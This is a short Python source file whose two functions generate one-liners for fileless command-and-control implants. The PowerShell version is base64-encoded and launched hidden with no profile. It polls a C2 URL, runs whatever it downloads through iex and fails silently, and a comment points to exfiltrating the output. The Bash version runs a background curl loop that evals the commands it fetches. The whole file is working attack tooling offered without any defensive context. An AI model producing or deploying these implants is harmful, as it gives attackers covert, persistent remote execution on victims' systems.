import base64

def generate_powershell_oneliner(c2_url, interval=30):
    """
    Generates a PowerShell one-liner for a fileless, in-memory C2 implant.
    This implant downloads and executes commands from a specified URL.
    """
    # PowerShell script to be executed on the target
    ps_script = f"""
while ($true) {{
    try {{
        $command = (New-Object System.Net.WebClient).DownloadString('{c2_url}');
        if ($command -ne 'No command available.' -and $command.Length -gt 1) {{
            $output = iex $command 2>&1 | Out-String;
            # In a real scenario, you'd exfiltrate the output.
            # For this version, we are just executing commands.
        }}
    }} catch {{
        # Fail silently
    }}
    Start-Sleep -Seconds {interval};
}}
"""
    # Encode the script in base64 to be used with powershell.exe -e
    encoded_script = base64.b64encode(ps_script.encode('utf16', 'surrogatepass')).decode()

    oneliner = f"powershell.exe -nop -w hidden -e {encoded_script}"
    return oneliner

def generate_bash_oneliner(c2_url, interval=30):
    """
    Generates a Bash one-liner for a fileless C2 implant.
    This implant uses curl to fetch and execute commands.
    """
    # The command runs a background loop that fetches and executes commands from the C2 URL.
    oneliner = f"bash -c 'while true; do command=$(curl -s {c2_url}); if [[ ! -z \"$command\" && \"$command\" != \"No command available.\" ]]; then eval \"$command\"; fi; sleep {interval}; done' &"
    return oneliner
